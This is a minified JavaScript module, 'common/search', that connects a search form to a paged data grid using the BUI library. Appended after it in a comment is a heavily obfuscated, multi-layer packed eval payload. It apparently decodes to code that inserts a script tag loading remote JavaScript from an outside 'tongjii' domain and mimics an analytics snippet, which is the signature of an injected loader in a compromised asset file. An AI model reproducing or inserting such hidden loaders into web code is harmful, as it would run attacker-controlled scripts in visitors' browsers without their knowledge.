define("common/search",["bui/common","bui/grid","bui/form","bui/data","bui/overlay"],function(e){var g=e("bui/common"),b=e("bui/grid"),f=e("bui/data"),a=e("bui/overlay"),d=e("bui/form");function c(h){c.superclass.constructor.call(this,h);this._init()}c.ATTRS={autoSearch:{value:true},gridId:{value:"grid"},formId:{value:"searchForm"},btnId:{value:"btnSearch"},formCfg:{value:{}},gridCfg:{},form:{},grid:{},store:{}};g.extend(c,g.Base);g.augment(c,{_init:function(){var h=this;h._initForm();h._initStoreEvent();h._initGrid();h._initEvent();h._initData()},_initEvent:function(){this._initDomEvent();this._initFormEvent();this._initGridEvent()},_initDomEvent:function(){var h=this,k=h.get("btnId"),i=h.get("store"),j=h.get("form");$("#"+k).on("click",function(l){l.preventDefault();j.valid();if(j.isValid()){h.load(true)}})},_initForm:function(){var h=this,j=h.get("form");if(!j){var i=g.merge(h.get("formCfg"),{srcNode:"#"+h.get("formId")});j=new d.HForm(i);j.render();h.set("form",j)}},_initFormEvent:function(){},_initGrid:function(){var h=this,k=h.get("grid");if(!k){var i=h.get("gridCfg"),j=h.get("store");i.store=j;i.render="#"+h.get("gridId"),k=new b.Grid(i);k.render();h.set("grid",k)}},_initGridEvent:function(){},_initData:function(){var h=this,i=h.get("autoSearch");if(i){h.load(true)}},_initStoreEvent:function(){var h=this,i=h.get("store");i.on("exception",function(j){g.Message.Alert(j.error)})},load:function(k){var h=this,j=h.get("form"),i=h.get("store"),l=j.serializeToObject();if(k){l.start=0;l.pageIndex=0}i.load(l)}});c.createStore=function(i,h){h=g.merge({autoLoad:false,url:i,pageSize:30},h);return new f.Store(h)};c.createGridCfg=function(i,h){h=g.merge({columns:i,loadMask:true,bbar:{pagingBar:true}},h);return h};c.createLink=function(h){var i='<span class="page-action grid-command" data-id="{id}" data-href="{href}" title="{title}">{text}</span>';return g.substitute(i,h)};return c});
/*
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))',62,91,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'),0,{}))
*/